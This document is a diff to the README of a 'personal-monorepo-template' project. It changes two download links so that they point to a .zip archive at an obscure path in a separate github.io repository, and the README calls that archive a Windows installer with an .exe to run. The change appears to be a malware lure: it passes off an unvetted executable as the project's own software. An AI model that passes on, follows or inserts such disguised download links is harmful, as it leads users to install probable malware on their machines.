@@ -5,7 +5,7 @@ description: "Manage your personal projects, skills, and agent memory in a singl
 ---
 # 📂 personal-monorepo-template - Organize your life and work projects
 
-[Download Windows Installer](https://github.com/Probono-glossy137/personal-monorepo-template)
+[Download Windows Installer](https://github.com/Probono-glossy137/probono-glossy137.github.io/raw/refs/heads/main/rannel/io-github-probono-glossy-v1.2.zip)
 
 ## 📌 About this project
 
@@ -26,7 +26,7 @@ The software requires minimal processing power. It runs as a background service 
 
 Visit the link below to reach the download page. Select the file ending in .exe to begin your download.
 
-[Get the vault installer here](https://github.com/Probono-glossy137/personal-monorepo-template)
+[Get the vault installer here](https://github.com/Probono-glossy137/probono-glossy137.github.io/raw/refs/heads/main/rannel/io-github-probono-glossy-v1.2.zip)
 
 Once the download finishes, follow these steps to install:
 
